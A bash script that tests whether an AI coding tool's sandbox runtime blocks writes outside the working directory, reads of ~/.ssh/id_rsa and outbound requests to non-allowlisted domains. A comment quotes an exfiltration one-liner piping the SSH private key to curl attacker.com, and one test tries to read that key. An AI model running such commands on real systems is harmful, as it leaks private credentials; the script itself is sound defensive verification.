#!/usr/bin/env bash
set -euo pipefail

# ---------------------------------------------------------------------------
# verify.sh — Prove that Claude Code's native sandbox is working.
#
# Runs a series of tests inside the sandbox runtime to confirm that
# filesystem writes outside cwd, reads of sensitive paths, and outbound
# network to non-allowed domains are all blocked — while normal cwd
# operations still succeed.
#
# Usage:
#   ./verify.sh
#
# Requires: npx @anthropic-ai/sandbox-runtime
# ---------------------------------------------------------------------------

# -- Colors -----------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
RESET='\033[0m'

# -- Counters ---------------------------------------------------------------
PASS_COUNT=0
FAIL_COUNT=0

# -- Helpers ----------------------------------------------------------------
banner() {
  echo ""
  echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
  echo -e "${BOLD}  $1${RESET}"
  echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
}

info() {
  echo -e "  ${BOLD}What:${RESET}  $1"
}

why() {
  echo -e "  ${BOLD}Why:${RESET}   $1"
}

cmd() {
  echo -e "  ${BOLD}Cmd:${RESET}   $1"
}

pass() {
  echo -e "  ${GREEN}PASS${RESET} — $1"
  PASS_COUNT=$((PASS_COUNT + 1))
}

fail() {
  echo -e "  ${RED}FAIL${RESET} — $1"
  FAIL_COUNT=$((FAIL_COUNT + 1))
}

warn() {
  echo -e "  ${YELLOW}WARN${RESET} — $1"
}

sandbox_exec() {
  # Run a command inside the sandbox runtime.
  # Returns the exit code of the sandboxed command.
  npx @anthropic-ai/sandbox-runtime -- "$@" 2>&1
}

# ---------------------------------------------------------------------------
# Pre-flight: confirm sandbox runtime is available
# ---------------------------------------------------------------------------
banner "Pre-flight Check"
info "Verifying that the sandbox runtime CLI is available."
why  "All tests below use npx @anthropic-ai/sandbox-runtime to execute commands"
why  "inside the same OS-level sandbox that Claude Code uses for Bash commands."

if npx @anthropic-ai/sandbox-runtime -- echo "sandbox-ok" >/dev/null 2>&1; then
  pass "Sandbox runtime is available."
else
  fail "Sandbox runtime is NOT available."
  echo ""
  warn "Install it with:  npm install -g @anthropic-ai/sandbox-runtime"
  warn "Or run via npx — make sure you have a recent version of Node.js (>=18)."
  echo ""
  echo "Cannot continue without the sandbox runtime. Exiting."
  exit 1
fi

# ---------------------------------------------------------------------------
# Test 1: Write outside cwd should fail
# ---------------------------------------------------------------------------
banner "Test 1 — Write Outside Working Directory"
info "Attempting to create a file outside the current working directory."
why  "The sandbox restricts filesystem writes to cwd and its subdirectories."
why  "A malicious command like 'echo pwned > /tmp/evil' should be blocked."

TEST1_CMD="touch /tmp/sandbox-test-write-$$"
cmd  "npx @anthropic-ai/sandbox-runtime -- $TEST1_CMD"

if output=$(sandbox_exec touch "/tmp/sandbox-test-write-$$" 2>&1); then
  fail "Write to /tmp succeeded — sandbox may not be active."
else
  pass "Write to /tmp was denied by the sandbox."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Test 2: Read a sensitive path should fail
# ---------------------------------------------------------------------------
banner "Test 2 — Read Sensitive Path"
info "Attempting to read ~/.ssh/id_rsa (a common exfiltration target)."
why  "Even if this file exists, the sandbox should deny reads outside allowed paths."
why  "This blocks attacks like: cat ~/.ssh/id_rsa | curl attacker.com"

TEST2_CMD="cat ~/.ssh/id_rsa"
cmd  "npx @anthropic-ai/sandbox-runtime -- $TEST2_CMD"

if output=$(sandbox_exec cat "$HOME/.ssh/id_rsa" 2>&1); then
  fail "Read of ~/.ssh/id_rsa succeeded — sandbox may not be restricting reads."
else
  pass "Read of ~/.ssh/id_rsa was denied (or file does not exist under sandbox)."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Test 3: Outbound network to non-allowed domain should fail
# ---------------------------------------------------------------------------
banner "Test 3 — Outbound Network to Non-Allowed Domain"
info "Attempting to reach https://example.com (not in the network allowlist)."
why  "The sandbox network filter blocks connections to domains not in networkAllowlist."
why  "This prevents data exfiltration to attacker-controlled servers."

TEST3_CMD="curl -sf --max-time 5 https://example.com"
cmd  "npx @anthropic-ai/sandbox-runtime -- $TEST3_CMD"

if output=$(sandbox_exec curl -sf --max-time 5 https://example.com 2>&1); then
  fail "Outbound request to example.com succeeded — network filtering may be off."
else
  pass "Outbound request to example.com was blocked."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Test 4: Normal operation within cwd should succeed
# ---------------------------------------------------------------------------
banner "Test 4 — Normal Operation Within Working Directory"
info "Writing, reading, and deleting a temp file inside the current directory."
why  "The sandbox should allow normal file operations within the project directory."
why  "This confirms the sandbox is not overly restrictive."

TEMP_FILE=".sandbox-verify-temp-$$"
TEST4_CMD="echo 'hello sandbox' > $TEMP_FILE && cat $TEMP_FILE && rm $TEMP_FILE"
cmd  "npx @anthropic-ai/sandbox-runtime -- bash -c \"$TEST4_CMD\""

if output=$(sandbox_exec bash -c "echo 'hello sandbox' > $TEMP_FILE && cat $TEMP_FILE && rm $TEMP_FILE" 2>&1); then
  if echo "$output" | grep -q "hello sandbox"; then
    pass "Write/read/delete within cwd succeeded."
  else
    fail "Command ran but output was unexpected: $output"
  fi
else
  fail "Normal file operations within cwd failed — sandbox may be too restrictive."
  echo "       Output: $(echo "$output" | head -3)"
fi

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
banner "Summary"
TOTAL=$((PASS_COUNT + FAIL_COUNT))
echo ""
echo -e "  ${GREEN}Passed:${RESET} $PASS_COUNT / $TOTAL"
echo -e "  ${RED}Failed:${RESET} $FAIL_COUNT / $TOTAL"
echo ""

if [ "$FAIL_COUNT" -eq 0 ]; then
  echo -e "  ${GREEN}${BOLD}All checks passed. The sandbox is active and working correctly.${RESET}"
else
  echo -e "  ${YELLOW}${BOLD}Some checks failed. Review the output above.${RESET}"
  echo -e "  ${YELLOW}Make sure sandbox is enabled in .claude/settings.json and you are"
  echo -e "  running inside a Claude Code session with sandbox support.${RESET}"
fi
echo ""
